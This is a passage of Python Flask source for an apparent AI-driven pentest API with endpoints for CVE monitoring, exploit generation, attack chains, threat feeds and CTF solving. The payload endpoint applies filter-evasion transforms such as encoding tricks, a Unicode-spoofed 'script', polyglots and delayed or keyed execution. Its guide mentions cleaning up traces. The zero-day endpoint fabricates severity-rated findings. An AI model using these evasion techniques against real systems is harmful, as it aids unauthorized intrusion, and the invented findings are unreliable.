# ADVANCED VULNERABILITY INTELLIGENCE API ENDPOINTS (v6.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/vuln-intel/cve-monitor", methods=["POST"])
def cve_monitor():
    """Monitor CVE databases for new vulnerabilities with AI analysis"""
    try:
        params = request.json
        hours = params.get("hours", 24)
        severity_filter = params.get("severity_filter", "HIGH,CRITICAL")
        keywords = params.get("keywords", "")

        logger.info(f"🔍 Monitoring CVE feeds for last {hours} hours with severity filter: {severity_filter}")

        # Fetch latest CVEs
        cve_results = cve_intelligence.fetch_latest_cves(hours, severity_filter)

        # Filter by keywords if provided
        if keywords and cve_results.get("success"):
            keyword_list = [k.strip().lower() for k in keywords.split(",")]
            filtered_cves = []

            for cve in cve_results.get("cves", []):
                description = cve.get("description", "").lower()
                if any(keyword in description for keyword in keyword_list):
                    filtered_cves.append(cve)

            cve_results["cves"] = filtered_cves
            cve_results["filtered_by_keywords"] = keywords
            cve_results["total_after_filter"] = len(filtered_cves)

        # Analyze exploitability for top CVEs
        exploitability_analysis = []
        for cve in cve_results.get("cves", [])[:5]:  # Analyze top 5 CVEs
            cve_id = cve.get("cve_id", "")
            if cve_id:
                analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
                if analysis.get("success"):
                    exploitability_analysis.append(analysis)

        result = {
            "success": True,
            "cve_monitoring": cve_results,
            "exploitability_analysis": exploitability_analysis,
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"📊 CVE monitoring completed | Found: {len(cve_results.get('cves', []))} CVEs")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in CVE monitoring: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/exploit-generate", methods=["POST"])
def exploit_generate():
    """Generate exploits from vulnerability data using AI"""
    try:
        params = request.json
        cve_id = params.get("cve_id", "")
        target_os = params.get("target_os", "")
        target_arch = params.get("target_arch", "x64")
        exploit_type = params.get("exploit_type", "poc")
        evasion_level = params.get("evasion_level", "none")

        # Additional target context
        target_info = {
            "target_os": target_os,
            "target_arch": target_arch,
            "exploit_type": exploit_type,
            "evasion_level": evasion_level,
            "target_ip": params.get("target_ip", "192.168.1.100"),
            "target_port": params.get("target_port", 80),
            "description": params.get("target_description", f"Target for {cve_id}")
        }

        if not cve_id:
            logger.warning("🤖 Exploit generation called without CVE ID")
            return jsonify({
                "success": False,
                "error": "CVE ID parameter is required"
            }), 400

        logger.info(f"🤖 Generating exploit for {cve_id} | Target: {target_os} {target_arch}")

        # First analyze the CVE for context
        cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)

        if not cve_analysis.get("success"):
            return jsonify({
                "success": False,
                "error": f"Failed to analyze CVE {cve_id}: {cve_analysis.get('error', 'Unknown error')}"
            }), 400

        # Prepare CVE data for exploit generation
        cve_data = {
            "cve_id": cve_id,
            "description": f"Vulnerability analysis for {cve_id}",
            "exploitability_level": cve_analysis.get("exploitability_level", "UNKNOWN"),
            "exploitability_score": cve_analysis.get("exploitability_score", 0)
        }

        # Generate exploit
        exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)

        # Search for existing exploits for reference
        existing_exploits = cve_intelligence.search_existing_exploits(cve_id)

        result = {
            "success": True,
            "cve_analysis": cve_analysis,
            "exploit_generation": exploit_result,
            "existing_exploits": existing_exploits,
            "target_info": target_info,
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Exploit generation completed for {cve_id}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in exploit generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/attack-chains", methods=["POST"])
def discover_attack_chains():
    """Discover multi-stage attack possibilities"""
    try:
        params = request.json
        target_software = params.get("target_software", "")
        attack_depth = params.get("attack_depth", 3)
        include_zero_days = params.get("include_zero_days", False)

        if not target_software:
            logger.warning("🔗 Attack chain discovery called without target software")
            return jsonify({
                "success": False,
                "error": "Target software parameter is required"
            }), 400

        logger.info(f"🔗 Discovering attack chains for {target_software} | Depth: {attack_depth}")

        # Discover attack chains
        chain_results = vulnerability_correlator.find_attack_chains(target_software, attack_depth)

        # Enhance with exploit generation for viable chains
        if chain_results.get("success") and chain_results.get("attack_chains"):
            enhanced_chains = []

            for chain in chain_results["attack_chains"][:2]:  # Enhance top 2 chains
                enhanced_chain = chain.copy()
                enhanced_stages = []

                for stage in chain["stages"]:
                    enhanced_stage = stage.copy()

                    # Try to generate exploit for this stage
                    vuln = stage.get("vulnerability", {})
                    cve_id = vuln.get("cve_id", "")

                    if cve_id:
                        try:
                            cve_data = {"cve_id": cve_id, "description": vuln.get("description", "")}
                            target_info = {"target_os": "linux", "target_arch": "x64", "evasion_level": "basic"}

                            exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)
                            enhanced_stage["exploit_available"] = exploit_result.get("success", False)

                            if exploit_result.get("success"):
                                enhanced_stage["exploit_code"] = exploit_result.get("exploit_code", "")[:500] + "..."
                        except:
                            enhanced_stage["exploit_available"] = False

                    enhanced_stages.append(enhanced_stage)

                enhanced_chain["stages"] = enhanced_stages
                enhanced_chains.append(enhanced_chain)

            chain_results["enhanced_chains"] = enhanced_chains

        result = {
            "success": True,
            "attack_chain_discovery": chain_results,
            "parameters": {
                "target_software": target_software,
                "attack_depth": attack_depth,
                "include_zero_days": include_zero_days
            },
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Attack chain discovery completed | Found: {len(chain_results.get('attack_chains', []))} chains")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in attack chain discovery: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/threat-feeds", methods=["POST"])
def threat_intelligence_feeds():
    """Aggregate and correlate threat intelligence from multiple sources"""
    try:
        params = request.json
        indicators = params.get("indicators", [])
        timeframe = params.get("timeframe", "30d")
        sources = params.get("sources", "all")

        if isinstance(indicators, str):
            indicators = [i.strip() for i in indicators.split(",")]

        if not indicators:
            logger.warning("🧠 Threat intelligence called without indicators")
            return jsonify({
                "success": False,
                "error": "Indicators parameter is required"
            }), 400

        logger.info(f"🧠 Correlating threat intelligence for {len(indicators)} indicators")

        correlation_results = {
            "indicators_analyzed": indicators,
            "timeframe": timeframe,
            "sources": sources,
            "correlations": [],
            "threat_score": 0,
            "recommendations": []
        }

        # Analyze each indicator
        cve_indicators = [i for i in indicators if i.startswith("CVE-")]
        ip_indicators = [i for i in indicators if i.replace(".", "").isdigit()]
        hash_indicators = [i for i in indicators if len(i) in [32, 40, 64] and all(c in "0123456789abcdef" for c in i.lower())]

        # Process CVE indicators
        for cve_id in cve_indicators:
            try:
                cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
                if cve_analysis.get("success"):
                    correlation_results["correlations"].append({
                        "indicator": cve_id,
                        "type": "cve",
                        "analysis": cve_analysis,
                        "threat_level": cve_analysis.get("exploitability_level", "UNKNOWN")
                    })

                    # Add to threat score
                    exploit_score = cve_analysis.get("exploitability_score", 0)
                    correlation_results["threat_score"] += min(exploit_score, 100)

                # Search for existing exploits
                exploits = cve_intelligence.search_existing_exploits(cve_id)
                if exploits.get("success") and exploits.get("total_exploits", 0) > 0:
                    correlation_results["correlations"].append({
                        "indicator": cve_id,
                        "type": "exploit_availability",
                        "exploits_found": exploits.get("total_exploits", 0),
                        "threat_level": "HIGH"
                    })
                    correlation_results["threat_score"] += 25

            except Exception as e:
                logger.warning(f"Error analyzing CVE {cve_id}: {str(e)}")

        # Process IP indicators (basic reputation check simulation)
        for ip in ip_indicators:
            # Simulate threat intelligence lookup
            correlation_results["correlations"].append({
                "indicator": ip,
                "type": "ip_reputation",
                "analysis": {
                    "reputation": "unknown",
                    "geolocation": "unknown",
                    "associated_threats": []
                },
                "threat_level": "MEDIUM"  # Default for unknown IPs
            })

        # Process hash indicators
        for hash_val in hash_indicators:
            correlation_results["correlations"].append({
                "indicator": hash_val,
                "type": "file_hash",
                "analysis": {
                    "hash_type": f"hash{len(hash_val)}",
                    "malware_family": "unknown",
                    "detection_rate": "unknown"
                },
                "threat_level": "MEDIUM"
            })

        # Calculate overall threat score and generate recommendations
        total_indicators = len(indicators)
        if total_indicators > 0:
            correlation_results["threat_score"] = min(correlation_results["threat_score"] / total_indicators, 100)

            if correlation_results["threat_score"] >= 75:
                correlation_results["recommendations"] = [
                    "Immediate threat response required",
                    "Block identified indicators",
                    "Enhance monitoring for related IOCs",
                    "Implement emergency patches for identified CVEs"
                ]
            elif correlation_results["threat_score"] >= 50:
                correlation_results["recommendations"] = [
                    "Elevated threat level detected",
                    "Increase monitoring for identified indicators",
                    "Plan patching for identified vulnerabilities",
                    "Review security controls"
                ]
            else:
                correlation_results["recommendations"] = [
                    "Low to medium threat level",
                    "Continue standard monitoring",
                    "Plan routine patching",
                    "Consider additional threat intelligence sources"
                ]

        result = {
            "success": True,
            "threat_intelligence": correlation_results,
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Threat intelligence correlation completed | Threat Score: {correlation_results['threat_score']:.1f}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in threat intelligence: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/zero-day-research", methods=["POST"])
def zero_day_research():
    """Automated zero-day vulnerability research using AI analysis"""
    try:
        params = request.json
        target_software = params.get("target_software", "")
        analysis_depth = params.get("analysis_depth", "standard")
        source_code_url = params.get("source_code_url", "")

        if not target_software:
            logger.warning("🔬 Zero-day research called without target software")
            return jsonify({
                "success": False,
                "error": "Target software parameter is required"
            }), 400

        logger.info(f"🔬 Starting zero-day research for {target_software} | Depth: {analysis_depth}")

        research_results = {
            "target_software": target_software,
            "analysis_depth": analysis_depth,
            "research_areas": [],
            "potential_vulnerabilities": [],
            "risk_assessment": {},
            "recommendations": []
        }

        # Define research areas based on software type
        common_research_areas = [
            "Input validation vulnerabilities",
            "Memory corruption issues",
            "Authentication bypasses",
            "Authorization flaws",
            "Cryptographic weaknesses",
            "Race conditions",
            "Logic flaws"
        ]

        # Software-specific research areas
        web_research_areas = [
            "Cross-site scripting (XSS)",
            "SQL injection",
            "Server-side request forgery (SSRF)",
            "Insecure deserialization",
            "Template injection"
        ]

        system_research_areas = [
            "Buffer overflows",
            "Privilege escalation",
            "Kernel vulnerabilities",
            "Service exploitation",
            "Configuration weaknesses"
        ]

        # Determine research areas based on target
        target_lower = target_software.lower()
        if any(web_tech in target_lower for web_tech in ["apache", "nginx", "tomcat", "php", "node", "django"]):
            research_results["research_areas"] = common_research_areas + web_research_areas
        elif any(sys_tech in target_lower for sys_tech in ["windows", "linux", "kernel", "driver"]):
            research_results["research_areas"] = common_research_areas + system_research_areas
        else:
            research_results["research_areas"] = common_research_areas

        # Simulate vulnerability discovery based on analysis depth
        vuln_count = {"quick": 2, "standard": 4, "comprehensive": 6}.get(analysis_depth, 4)

        for i in range(vuln_count):
            potential_vuln = {
                "id": f"RESEARCH-{target_software.upper()}-{i+1:03d}",
                "category": research_results["research_areas"][i % len(research_results["research_areas"])],
                "severity": ["LOW", "MEDIUM", "HIGH", "CRITICAL"][i % 4],
                "confidence": ["LOW", "MEDIUM", "HIGH"][i % 3],
                "description": f"Potential {research_results['research_areas'][i % len(research_results['research_areas'])].lower()} in {target_software}",
                "attack_vector": "To be determined through further analysis",
                "impact": "To be assessed",
                "proof_of_concept": "Research phase - PoC development needed"
            }
            research_results["potential_vulnerabilities"].append(potential_vuln)

        # Risk assessment
        high_risk_count = sum(1 for v in research_results["potential_vulnerabilities"] if v["severity"] in ["HIGH", "CRITICAL"])
        total_vulns = len(research_results["potential_vulnerabilities"])

        research_results["risk_assessment"] = {
            "total_areas_analyzed": len(research_results["research_areas"]),
            "potential_vulnerabilities_found": total_vulns,
            "high_risk_findings": high_risk_count,
            "risk_score": min((high_risk_count * 25 + (total_vulns - high_risk_count) * 10), 100),
            "research_confidence": analysis_depth
        }

        # Generate recommendations
        if high_risk_count > 0:
            research_results["recommendations"] = [
                "Prioritize security testing in identified high-risk areas",
                "Conduct focused penetration testing",
                "Implement additional security controls",
                "Consider bug bounty program for target software",
                "Perform code review in identified areas"
            ]
        else:
            research_results["recommendations"] = [
                "Continue standard security testing",
                "Monitor for new vulnerability research",
                "Implement defense-in-depth strategies",
                "Regular security assessments recommended"
            ]

        # Source code analysis simulation
        if source_code_url:
            research_results["source_code_analysis"] = {
                "repository_url": source_code_url,
                "analysis_status": "simulated",
                "findings": [
                    "Static analysis patterns identified",
                    "Potential code quality issues detected",
                    "Security-relevant functions located"
                ],
                "recommendation": "Manual code review recommended for identified areas"
            }

        result = {
            "success": True,
            "zero_day_research": research_results,
            "disclaimer": "This is simulated research for demonstration. Real zero-day research requires extensive manual analysis.",
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Zero-day research completed | Risk Score: {research_results['risk_assessment']['risk_score']}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in zero-day research: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/ai/advanced-payload-generation", methods=["POST"])
def advanced_payload_generation():
    """Generate advanced payloads with AI-powered evasion techniques"""
    try:
        params = request.json
        attack_type = params.get("attack_type", "rce")
        target_context = params.get("target_context", "")
        evasion_level = params.get("evasion_level", "standard")
        custom_constraints = params.get("custom_constraints", "")

        if not attack_type:
            logger.warning("🎯 Advanced payload generation called without attack type")
            return jsonify({
                "success": False,
                "error": "Attack type parameter is required"
            }), 400

        logger.info(f"🎯 Generating advanced {attack_type} payload with {evasion_level} evasion")

        # Enhanced payload generation with contextual AI
        target_info = {
            "attack_type": attack_type,
            "complexity": "advanced",
            "technology": target_context,
            "evasion_level": evasion_level,
            "constraints": custom_constraints
        }

        # Generate base payloads using existing AI system
        base_result = ai_payload_generator.generate_contextual_payload(target_info)

        # Enhance with advanced techniques
        advanced_payloads = []

        for payload_info in base_result.get("payloads", [])[:10]:  # Limit to 10 advanced payloads
            enhanced_payload = {
                "payload": payload_info["payload"],
                "original_context": payload_info["context"],
                "risk_level": payload_info["risk_level"],
                "evasion_techniques": [],
                "deployment_methods": []
            }

            # Apply evasion techniques based on level
            if evasion_level in ["advanced", "nation-state"]:
                # Advanced encoding techniques
                encoded_variants = [
                    {
                        "technique": "Double URL Encoding",
                        "payload": payload_info["payload"].replace("%", "%25").replace(" ", "%2520")
                    },
                    {
                        "technique": "Unicode Normalization",
                        "payload": payload_info["payload"].replace("script", "scr\u0131pt")
                    },
                    {
                        "technique": "Case Variation",
                        "payload": "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload_info["payload"]))
                    }
                ]
                enhanced_payload["evasion_techniques"].extend(encoded_variants)

            if evasion_level == "nation-state":
                # Nation-state level techniques
                advanced_techniques = [
                    {
                        "technique": "Polyglot Payload",
                        "payload": f"/*{payload_info['payload']}*/ OR {payload_info['payload']}"
                    },
                    {
                        "technique": "Time-delayed Execution",
                        "payload": f"setTimeout(function(){{{payload_info['payload']}}}, 1000)"
                    },
                    {
                        "technique": "Environmental Keying",
                        "payload": f"if(navigator.userAgent.includes('specific')){{ {payload_info['payload']} }}"
                    }
                ]
                enhanced_payload["evasion_techniques"].extend(advanced_techniques)

            # Deployment methods
            enhanced_payload["deployment_methods"] = [
                "Direct injection",
                "Parameter pollution",
                "Header injection",
                "Cookie manipulation",
                "Fragment-based delivery"
            ]

            advanced_payloads.append(enhanced_payload)

        # Generate deployment instructions
        deployment_guide = {
            "pre_deployment": [
                "Reconnaissance of target environment",
                "Identification of input validation mechanisms",
                "Analysis of security controls (WAF, IDS, etc.)",
                "Selection of appropriate evasion techniques"
            ],
            "deployment": [
                "Start with least detectable payloads",
                "Monitor for defensive responses",
                "Escalate evasion techniques as needed",
                "Document successful techniques for future use"
            ],
            "post_deployment": [
                "Monitor for payload execution",
                "Clean up traces if necessary",
                "Document findings",
                "Report vulnerabilities responsibly"
            ]
        }

        result = {
            "success": True,
            "advanced_payload_generation": {
                "attack_type": attack_type,
                "evasion_level": evasion_level,
                "target_context": target_context,
                "payload_count": len(advanced_payloads),
                "advanced_payloads": advanced_payloads,
                "deployment_guide": deployment_guide,
                "custom_constraints_applied": custom_constraints if custom_constraints else "none"
            },
            "disclaimer": "These payloads are for authorized security testing only. Ensure proper authorization before use.",
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Advanced payload generation completed | Generated: {len(advanced_payloads)} payloads")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in advanced payload generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# CTF COMPETITION EXCELLENCE FRAMEWORK API ENDPOINTS (v8.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/ctf/create-challenge-workflow", methods=["POST"])
def create_ctf_challenge_workflow():
    """Create specialized workflow for CTF challenge"""
    try:
        params = request.json
        challenge_name = params.get("name", "")
        category = params.get("category", "misc")
        difficulty = params.get("difficulty", "unknown")
        points = params.get("points", 100)
        description = params.get("description", "")
        target = params.get("target", "")

        if not challenge_name:
            return jsonify({"error": "Challenge name is required"}), 400

        # Create CTF challenge object
        challenge = CTFChallenge(
            name=challenge_name,
            category=category,
            difficulty=difficulty,
            points=points,
            description=description,
            target=target
        )

        # Generate workflow
        workflow = ctf_manager.create_ctf_challenge_workflow(challenge)

        logger.info(f"🎯 CTF workflow created for {challenge_name} | Category: {category} | Difficulty: {difficulty}")
        return jsonify({
            "success": True,
            "workflow": workflow,
            "challenge": challenge.to_dict(),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating CTF workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/auto-solve-challenge", methods=["POST"])
def auto_solve_ctf_challenge():
    """Attempt to automatically solve a CTF challenge"""
    try:
        params = request.json
        challenge_name = params.get("name", "")
        category = params.get("category", "misc")
        difficulty = params.get("difficulty", "unknown")
        points = params.get("points", 100)
        description = params.get("description", "")
        target = params.get("target", "")

        if not challenge_name:
            return jsonify({"error": "Challenge name is required"}), 400

        # Create CTF challenge object
        challenge = CTFChallenge(
            name=challenge_name,
            category=category,
            difficulty=difficulty,
            points=points,
            description=description,
            target=target
        )

        # Attempt automated solving
        result = ctf_automator.auto_solve_challenge(challenge)

        logger.info(f"🤖 CTF auto-solve attempted for {challenge_name} | Status: {result['status']}")
        return jsonify({
            "success": True,
            "solve_result": result,
            "challenge": challenge.to_dict(),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in CTF auto-solve: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/team-strategy", methods=["POST"])
def create_ctf_team_strategy():
    """Create optimal team strategy for CTF competition"""
    try:
        params = request.json
        challenges_data = params.get("challenges", [])
        team_skills = params.get("team_skills", {})

        if not challenges_data:
            return jsonify({"error": "Challenges data is required"}), 400

        # Convert challenge data to CTFChallenge objects
        challenges = []
        for challenge_data in challenges_data:
            challenge = CTFChallenge(
                name=challenge_data.get("name", ""),
                category=challenge_data.get("category", "misc"),
                difficulty=challenge_data.get("difficulty", "unknown"),
                points=challenge_data.get("points", 100),
                description=challenge_data.get("description", ""),
                target=challenge_data.get("target", "")
            )
            challenges.append(challenge)

        # Generate team strategy
        strategy = ctf_coordinator.optimize_team_strategy(challenges, team_skills)

        logger.info(f"👥 CTF team strategy created | Challenges: {len(challenges)} | Team members: {len(team_skills)}")
        return jsonify({
            "success": True,
            "strategy": strategy,
            "challenges_count": len(challenges),
            "team_size": len(team_skills),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating CTF team strategy: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/suggest-tools", methods=["POST"])
def suggest_ctf_tools():
    """Suggest optimal tools for CTF challenge based on description and category"""
    try:
        params = request.json
        description = params.get("description", "")
        category = params.get("category", "misc")

        if not description:
            return jsonify({"error": "Challenge description is required"}), 400

        # Get tool suggestions
        suggested_tools = ctf_tools.suggest_tools_for_challenge(description, category)
        category_tools = ctf_tools.get_category_tools(f"{category}_recon")

        # Get tool commands
        tool_commands = {}
        for tool in suggested_tools:
            try:
                tool_commands[tool] = ctf_tools.get_tool_command(tool, "TARGET")
            except:
                tool_commands[tool] = f"{tool} TARGET"

        logger.info(f"🔧 CTF tools suggested | Category: {category} | Tools: {len(suggested_tools)}")
        return jsonify({
            "success": True,
            "suggested_tools": suggested_tools,
            "category_tools": category_tools,
            "tool_commands": tool_commands,
            "category": category,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error suggesting CTF tools: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/cryptography-solver", methods=["POST"])
def ctf_cryptography_solver():
    """Advanced cryptography challenge solver with multiple attack methods"""
    try:
        params = request.json
        cipher_text = params.get("cipher_text", "")
        cipher_type = params.get("cipher_type", "unknown")
        key_hint = params.get("key_hint", "")
        known_plaintext = params.get("known_plaintext", "")
        additional_info = params.get("additional_info", "")

        if not cipher_text:
            return jsonify({"error": "Cipher text is required"}), 400

        results = {
            "cipher_text": cipher_text,
            "cipher_type": cipher_type,
            "analysis_results": [],
            "potential_solutions": [],
            "recommended_tools": [],
            "next_steps": []
        }

        # Cipher type identification
        if cipher_type == "unknown":
            # Basic cipher identification heuristics
            if re.match(r'^[0-9a-fA-F]+$', cipher_text.replace(' ', '')):
                results["analysis_results"].append("Possible hexadecimal encoding")
                results["recommended_tools"].extend(["hex", "xxd"])

            if re.match(r'^[A-Za-z0-9+/]+=*$', cipher_text.replace(' ', '')):
                results["analysis_results"].append("Possible Base64 encoding")
                results["recommended_tools"].append("base64")

            if len(set(cipher_text.upper().replace(' ', ''))) <= 26:
                results["analysis_results"].append("Possible substitution cipher")
                results["recommended_tools"].extend(["frequency-analysis", "substitution-solver"])

        # Hash identification
        hash_patterns = {
            32: "MD5",
            40: "SHA1",
            64: "SHA256",
            128: "SHA512"
        }

        clean_text = cipher_text.replace(' ', '').replace('\n', '')
        if len(clean_text) in hash_patterns and re.match(r'^[0-9a-fA-F]+$', clean_text):
            hash_type = hash_patterns[len(clean_text)]
            results["analysis_results"].append(f"Possible {hash_type} hash")
            results["recommended_tools"].extend(["hashcat", "john", "hash-identifier"])

        # Frequency analysis for substitution ciphers
        if cipher_type in ["substitution", "caesar", "vigenere"] or "substitution" in results["analysis_results"]:
            char_freq = {}
            for char in cipher_text.upper():
                if char.isalpha():
                    char_freq[char] = char_freq.get(char, 0) + 1

            if char_freq:
                most_common = max(char_freq, key=char_freq.get)
                results["analysis_results"].append(f"Most frequent character: {most_common} ({char_freq[most_common]} occurrences)")
                results["next_steps"].append("Try substituting most frequent character with 'E'")

        # ROT/Caesar cipher detection
        if cipher_type == "caesar" or len(set(cipher_text.upper().replace(' ', ''))) <= 26:
            results["recommended_tools"].append("rot13")
            results["next_steps"].append("Try all ROT values (1-25)")

        # RSA-specific analysis
        if cipher_type == "rsa" or "rsa" in additional_info.lower():
            results["recommended_tools"].extend(["rsatool", "factordb", "yafu"])
            results["next_steps"].extend([
                "Check if modulus can be factored",
                "Look for small public exponent attacks",
                "Check for common modulus attacks"
            ])

        # Vigenère cipher analysis
        if cipher_type == "vigenere" or "vigenere" in additional_info.lower():
            results["recommended_tools"].append("vigenere-solver")
            results["next_steps"].extend([
                "Perform Kasiski examination for key length",
                "Use index of coincidence analysis",
                "Try common key words"
            ])

        logger.info(f"🔐 CTF crypto analysis completed | Type: {cipher_type} | Tools: {len(results['recommended_tools'])}")
        return jsonify({
            "success": True,
            "analysis": results,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in CTF crypto solver: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/forensics-analyzer", methods=["POST"])
def ctf_forensics_analyzer():
    """Advanced forensics challenge analyzer with multiple investigation techniques"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        analysis_type = params.get("analysis_type", "comprehensive")
        extract_hidden = params.get("extract_hidden", True)
        check_steganography = params.get("check_steganography", True)

        if not file_path:
            return jsonify({"error": "File path is required"}), 400

        results = {
            "file_path": file_path,
            "analysis_type": analysis_type,
            "file_info": {},
            "metadata": {},
            "hidden_data": [],
            "steganography_results": [],
            "recommended_tools": [],
            "next_steps": []
        }

        # Basic file analysis
        try:
            # File command
            file_result = subprocess.run(['file', file_path], capture_output=True, text=True, timeout=30)
            if file_result.returncode == 0:
                results["file_info"]["type"] = file_result.stdout.strip()

                # Determine file category and suggest tools
                file_type = file_result.stdout.lower()
                if "image" in file_type:
                    results["recommended_tools"].extend(["exiftool", "steghide", "stegsolve", "zsteg"])
                    results["next_steps"].extend([
                        "Extract EXIF metadata",
                        "Check for steganographic content",
                        "Analyze color channels separately"
                    ])
                elif "audio" in file_type:
                    results["recommended_tools"].extend(["audacity", "sonic-visualizer", "spectrum-analyzer"])
                    results["next_steps"].extend([
                        "Analyze audio spectrum",
                        "Check for hidden data in audio channels",
                        "Look for DTMF tones or morse code"
                    ])
                elif "pdf" in file_type:
                    results["recommended_tools"].extend(["pdfinfo", "pdftotext", "binwalk"])
                    results["next_steps"].extend([
                        "Extract text and metadata",
                        "Check for embedded files",
                        "Analyze PDF structure"
                    ])
                elif "zip" in file_type or "archive" in file_type:
                    results["recommended_tools"].extend(["unzip", "7zip", "binwalk"])
                    results["next_steps"].extend([
                        "Extract archive contents",
                        "Check for password protection",
                        "Look for hidden files"
                    ])
        except Exception as e:
            results["file_info"]["error"] = str(e)

        # Metadata extraction
        try:
            exif_result = subprocess.run(['exiftool', file_path], capture_output=True, text=True, timeout=30)
            if exif_result.returncode == 0:
                results["metadata"]["exif"] = exif_result.stdout
        except Exception as e:
            results["metadata"]["exif_error"] = str(e)

        # Binwalk analysis for hidden files
        if extract_hidden:
            try:
                binwalk_result = subprocess.run(['binwalk', '-e', file_path], capture_output=True, text=True, timeout=60)
                if binwalk_result.returncode == 0:
                    results["hidden_data"].append({
                        "tool": "binwalk",
                        "output": binwalk_result.stdout
                    })
            except Exception as e:
                results["hidden_data"].append({
                    "tool": "binwalk",
                    "error": str(e)
                })

        # Steganography checks
        if check_steganography:
            # Check for common steganography tools
            steg_tools = ["steghide", "zsteg", "outguess"]
            for tool in steg_tools:
                try:
                    if tool == "steghide":
                        steg_result = subprocess.run([tool, 'info', file_path], capture_output=True, text=True, timeout=30)
                    elif tool == "zsteg":
                        steg_result = subprocess.run([tool, '-a', file_path], capture_output=True, text=True, timeout=30)
                    elif tool == "outguess":
                        steg_result = subprocess.run([tool, '-r', file_path, '/tmp/outguess_output'], capture_output=True, text=True, timeout=30)

                    if steg_result.returncode == 0 and steg_result.stdout.strip():
                        results["steganography_results"].append({
                            "tool": tool,
                            "output": steg_result.stdout
                        })
                except Exception as e:
                    results["steganography_results"].append({
                        "tool": tool,
                        "error": str(e)
                    })

        # Strings analysis
        try:
            strings_result = subprocess.run(['strings', file_path], capture_output=True, text=True, timeout=30)
            if strings_result.returncode == 0:
                # Look for interesting strings (flags, URLs, etc.)
                interesting_strings = []
                for line in strings_result.stdout.split('\n'):
                    if any(keyword in line.lower() for keyword in ['flag', 'password', 'key', 'secret', 'http', 'ftp']):
                        interesting_strings.append(line.strip())

                if interesting_strings:
                    results["hidden_data"].append({
                        "tool": "strings",
                        "interesting_strings": interesting_strings[:20]  # Limit to first 20
                    })
        except Exception as e:
            results["hidden_data"].append({
                "tool": "strings",
                "error": str(e)
            })

        logger.info(f"🔍 CTF forensics analysis completed | File: {file_path} | Tools used: {len(results['recommended_tools'])}")
        return jsonify({
            "success": True,
            "analysis": results,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in CTF forensics analyzer: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/ctf/binary-analyzer", methods=["POST"])
def ctf_binary_analyzer():
    """Advanced binary analysis for reverse engineering and pwn challenges"""
    try:
        params = request.json
        binary_path = params.get("binary_path", "")
        analysis_depth = params.get("analysis_depth", "comprehensive")  # basic, comprehensive, deep
        check_protections = params.get("check_protections", True)
        find_gadgets = params.get("find_gadgets", True)

        if not binary_path:
            return jsonify({"error": "Binary path is required"}), 400

        results = {
            "binary_path": binary_path,
            "analysis_depth": analysis_depth,
            "file_info": {},
            "security_protections": {},
            "interesting_functions": [],
            "strings_analysis": {},
            "gadgets": [],
            "recommended_tools": [],
            "exploitation_hints": []
        }

        # Basic file information
        try:
            file_result = subprocess.run(['file', binary_path], capture_output=True, text=True, timeout=30)
            if file_result.returncode == 0:
                results["file_info"]["type"] = file_result.stdout.strip()

                # Determine architecture and suggest tools
                file_output = file_result.stdout.lower()
                if "x86-64" in file_output or "x86_64" in file_output:
                    results["file_info"]["architecture"] = "x86_64"
                elif "i386" in file_output or "80386" in file_output:
                    results["file_info"]["architecture"] = "i386"
                elif "arm" in file_output:
                    results["file_info"]["architecture"] = "ARM"

                results["recommended_tools"].extend(["gdb-peda", "radare2", "ghidra"])
        except Exception as e:
            results["file_info"]["error"] = str(e)

        # Security protections check
        if check_protections:
            try:
                checksec_result = subprocess.run(['checksec', '--file', binary_path], capture_output=True, text=True, timeout=30)
                if checksec_result.returncode == 0:
                    results["security_protections"]["checksec"] = checksec_result.stdout

                    # Parse protections and provide exploitation hints
                    output = checksec_result.stdout.lower()
